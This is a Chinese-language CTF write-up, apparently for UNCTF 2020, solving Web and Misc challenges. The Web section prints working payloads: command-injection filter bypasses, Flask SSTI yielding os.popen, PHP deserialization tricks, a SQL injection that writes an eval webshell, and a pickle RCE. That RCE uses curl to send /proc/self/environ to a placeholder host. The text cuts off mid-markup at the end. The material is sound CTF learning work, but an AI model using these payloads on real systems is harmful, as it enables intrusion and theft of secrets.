        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><p>简单的目录穿越，构造 <code>?url=/unctf.com/../flag</code> 即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214121751204.9636c5c17aa1c69f7e391a64f8387c81aa5df0a7.png" alt="image-20201115205450581"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;78ef5928-3393-4b23-a9ca-de433e161c3a&#125;</span><br></pre></td></tr></table></figure><h3 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h3><p>根据提示，可以知道 flag 在 flag.php 中。题目过滤了括号，根据 PHP 的特性整点反引号，再用 od 来输出以绕过字符的检测，构造 <code>?a=echo `od -A d -c f???.???`; </code> 可以得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214121904308.bedbb95d2b65798a516bfb9acd34393c2ab6b3ba.png" alt="image-20201115210404436"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;0b8654d3-3a70-4549-bf90-ef9b58d8cfef&#125;</span><br></pre></td></tr></table></figure><h3 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h3><p>bash 指令的堆叠，过滤了一些字符，使用 <code>%0a</code> 作为指令分割，<code>%09</code> 作为指令中的分隔，构造 <code>?url=1.1.1.1%0aod%09-A%09d%09-c%09/f???%0a</code> 即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122167826.d153ca02a60f3375cdf9005e0701130b853219ac.png" alt="image-20201115211301682"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;d0faa519-cb49-404a-a99b-891d37c5690d&#125;</span><br></pre></td></tr></table></figure><h3 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h3><p>在 <code>/register</code> 路由下注册用户名为 <code>admin</code> 的用户后在 <code>/login</code> 下登录，回到首页后可以得到 <code>admin login success and check the secret route /secret_route_you_do_not_know</code>。</p><p>定位到提示的路由，发现一个 <code>guess</code> 参数，发现存在 SSTI。继续尝试发现很多字符被 ban 了，于是尝试 attr 绕过。以 <code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;</code> 范本，构造 attr 绕过参数，得到如下结果。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?guess=&#123;&#123;(config|attr(request.args.param)|attr(request.args.param1)|attr(request.args.param2)|attr(request.args.param3)(request.args.param4)|attr(request.args.param5)(request.args.param6)|attr(request.args.param7)())&#125;&#125;</span><br><span class="line">&amp;param=__class__</span><br><span class="line">&amp;param1=__init__</span><br><span class="line">&amp;param2=__globals__</span><br><span class="line">&amp;param3=__getitem__</span><br><span class="line">&amp;param4=os</span><br><span class="line">&amp;param5=popen</span><br><span class="line">&amp;param6=ls</span><br><span class="line">&amp;param7=read</span><br></pre></td></tr></table></figure><p>得到 <code>__pycache__ app.py flag.txt templates error!!</code> 的回显，可知 flag 在当前目录下，继续构造 <code>cat flag.txt</code> 得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;f1065588-34fc-4817-809d-753b58da3321&#125;</span><br></pre></td></tr></table></figure><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>字符串和 bool 的 true弱比较的时候相等，配合反序列化控制变量。构造出 payload 如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;username&quot;</span>=&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="literal">true</span></span><br><span class="line">));</span><br></pre></td></tr></table></figure><p>得到 <code>a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</code>。将其以 POST 的方式作为参数 <code>data</code> 传送，即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122403630.b391e6a29b3c7684719dd2935586df66b14b71f0.png" alt="image-20201115221423513"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;40371f04-6f0f-4eb9-8768-85e503928711&#125;</span><br></pre></td></tr></table></figure><h3 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h3><p>反序列化字符逃逸，关键在于 <code>return str_replace(&#39;challenge&#39;, &#39;easychallenge&#39;, $string);</code> 的少变多的操作，可以在序列化字符串末尾拼接逃逸。计算逃逸字符数并构造 payload 如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> filter(serialize(<span class="keyword">new</span> a(<span class="string">&quot;LemonPrefectchallengechallengechallengechallengechallengechallengechallengechallenge\&quot;;s:8:\&quot;password\&quot;;s:4:\&quot;easy\&quot;;&#125;nox&quot;</span>, <span class="string">&quot;easy&quot;</span>)));</span><br></pre></td></tr></table></figure><p>得到 <code>O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:116:&quot;LemonPrefecteasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;nox&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code>，将其中需要填入的参数取出，构造得 <code>?1=LemonPrefecteasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;nox</code>。将构造所得参数作为 GET 参数发起请求即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122647160.faf716599f6680c58b30331b208d16f5fef0b694.png" alt="image-20201115223022446"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;78cae2f3-89df-4ae3-a63c-23ef9efa0383&#125;</span><br></pre></td></tr></table></figure><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>查看 response header 中的 <code>X-Powered-By: PHP/7.4.5</code>， 查阅手册可知代码中部分函数已经被停用，进而简化代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$adminPassword</span> = <span class="string">&#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getVars</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$totals</span> = array_merge(<span class="variable">$_GET</span>, <span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">if</span> (count(<span class="variable">$_GET</span>)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $&#123;<span class="variable">$key</span>&#125;;</span><br><span class="line">            <span class="keyword">if</span> (is_array(<span class="variable">$value</span>)) &#123;</span><br><span class="line">                <span class="variable">$temp_array</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$value</span> <span class="keyword">as</span> <span class="variable">$key2</span> =&gt; <span class="variable">$value2</span>) &#123;</span><br><span class="line">                    <span class="variable">$temp_array</span>[<span class="variable">$key2</span>] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim(<span class="variable">$value2</span>))));</span><br><span class="line">                &#125;</span><br><span class="line">                $&#123;<span class="variable">$key</span>&#125; = <span class="variable">$_GET</span>[<span class="variable">$key</span>] = <span class="variable">$temp_array</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $&#123;<span class="variable">$key</span>&#125; = <span class="variable">$_GET</span>[<span class="variable">$key</span>] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim(<span class="variable">$value</span>))));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getVars();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin才能设置环境变量</span></span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$password</span>) === <span class="variable">$adminPassword</span> &amp;&amp; sha1(<span class="variable">$verif</span>) == <span class="variable">$verif</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you can set config variables!!&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys(<span class="variable">$GLOBALS</span>) <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, <span class="variable">$key</span>) &amp;&amp; strlen(<span class="variable">$GLOBALS</span>[<span class="variable">$key</span>]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> strlen((<span class="variable">$GLOBALS</span>[<span class="variable">$key</span>]));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="variable">$key</span>] . <span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="variable">$key</span>] . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys(<span class="variable">$GLOBALS</span>) <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="variable">$GLOBALS</span>[<span class="variable">$key</span>]) . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>审计可知所有请求变量会被设置至全局，同时所有单引号和双引号均会被加上反斜杠以转义。设置环境变量的地方进行了简单的 md5 和 sha1 验证，同时对参数长度和名称做出限定。</p><p><code>adminPassword</code> 可以直接利用变量的全局设定轻松覆盖，因此得到<code>password=LemonPrefect&amp;adminPassword=7f41a8661986fdd34d63d4cdde2249c5</code>。查阅资料可知，<code>0e01000111101111110010010010000001001001</code> 的 sha1 仍然为 <code>0e</code> 开头，进而达成 0 == 0 的比较。利用一个全局变量加一个将被拼接执行的变量 <code>var1</code> 即可达成查看 phpinfo。同时，<code>var1</code> 需要配合语句的闭合。因此，构造 <code>var1=\&quot;;$b();?&gt;</code>，<code>b=phpinfo</code>。</p><p>整理上述参数，得到 payload。</p> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?password=LemonPrefect</span><br><span class="line">&amp;adminPassword=7f41a8661986fdd34d63d4cdde2249c5</span><br><span class="line">&amp;verif=0e01000111101111110010010010000001001001</span><br><span class="line">&amp;b=phpinfo </span><br><span class="line">&amp;var1=\&quot;;$b();?&gt; </span><br></pre></td></tr></table></figure><p>将上述参数构造请求发送即可得到 phpinfo，在其中可以找到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122809152.05e7211282a1e1807f8e88a212a7f12c166c2e22.png" alt="image-20201115225456544"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;720731af-7dc9-45fa-b252-a82cc4601de9&#125;</span><br></pre></td></tr></table></figure><h3 id="checkin-sql"><a href="#checkin-sql" class="headerlink" title="checkin-sql"></a>checkin-sql</h3><p>看起来很像人畜无害的随便注，然而随便注的三种套路都不行。关键在于 <code>PREPARE</code> 与十六进制的配合。 <code>PREPARE</code> 可以构造出 <code>prepare d from 0x73656c6563742f2a2a2f223c3f70687020406576616c28245f504f53545b615d293b203f3e2220696e746f206f757466696c6520272f7661722f7777772f68746d6c2f612e70687027;execute d;</code> 这样的语句来写入一个文件，从而直接 getshell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x73656c6563742f2a2a2f223c3f70687020406576616c28245f504f53545b615d293b203f3e2220696e746f206f757466696c6520272f7661722f7777772f68746d6c2f612e70687027</span><br><span class="line">&#x3D;&gt; select&#x2F;**&#x2F;&quot;&lt;?php @eval($_POST[a]); ?&gt;&quot; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php&#39;</span><br></pre></td></tr></table></figure><p>getshell 之后直接构造 <code>system(&quot;cat /flag&quot;);</code> 可得 flag。</p><h3 id="easy-flask2"><a href="#easy-flask2" class="headerlink" title="easy_flask2"></a>easy_flask2</h3><blockquote><p><strong>pickle 反序列化 参考</strong></p><p><a href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a></p></blockquote><p>从 <code>/source</code> 路由读取源码，可以发现 flag 存放在环境变量中。同时发现可控的 pickle 反序列化点，简单过滤了 <code>R</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if session.get(&#39;name&#39;):</span><br><span class="line">    if b&#39;R&#39; in base64.b64decode(request.cookies[&#39;pkl&#39;]):</span><br><span class="line">        return &quot;RCE??&quot;</span><br><span class="line">    person &#x3D; pickle.loads(base64.b64decode(request.cookies[&#39;pkl&#39;]))</span><br></pre></td></tr></table></figure><p>从参考处获取不含 <code>R</code> 的 payload，因为没有回显，所以构造一个 curl 请求来从服务端使用 <code>nc</code> 监听来获取文件内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#39;&#39;&#39;(S&#39;curl  -F &quot;filename&#x3D;@&#x2F;proc&#x2F;self&#x2F;environ&quot; YOUR_HOST&#39;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#39;&#39;&#39;</span><br></pre></td></tr></table></figure><p>按照题目的方式，在登陆后定向到 <code>/login</code> 路由后，将 payload base64 编码后设置到 <code>pkl</code> cookie。刷新页面，即可在监听处获取到环境变量的内容，其中包含 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123024658.c30471900b24d94744e84eabb6cfcc2e9e4a2394.png" alt="image-20201115230937913"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;a1b56cec-8b90-4e22-a8e1-98069088bb13&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="阴阳人编码"><a href="#阴阳人编码" class="headerlink" title="阴阳人编码"></a>阴阳人编码</h3><p>将 <code>就这</code> <code>不会吧</code> 都替换成 <code>Ook</code> 并整理符号后得到如下文本。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!</span><br><span class="line">Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook.</span><br><span class="line">Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook.</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?</span><br><span class="line">Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?</span><br><span class="line">Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook.</span><br><span class="line">Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook. Ook? Ook. </span><br></pre></td></tr></table></figure><p>将其解码后得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9_zhe_Jiu_zhe_8_hui_8&#125;</span><br></pre></td></tr></table></figure><h3 id="YLB’s-CAPTCHA-签到题"><a href="#YLB’s-CAPTCHA-签到题" class="headerlink" title="YLB’s CAPTCHA - 签到题"></a>YLB’s CAPTCHA - 签到题</h3><p>验证码图片截下来，PS 调整色阶到能看得很清的程度，然后输入验证码，积累十个正确提交得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123272140.ff1b9e10381366286020a6f8b504080bb2938ac0.png" alt="image-20201115233514388"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123502272.c6fa4cc694961b245795b54f5f2229cb5e397cc1.png" alt="image-20201115233125644"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 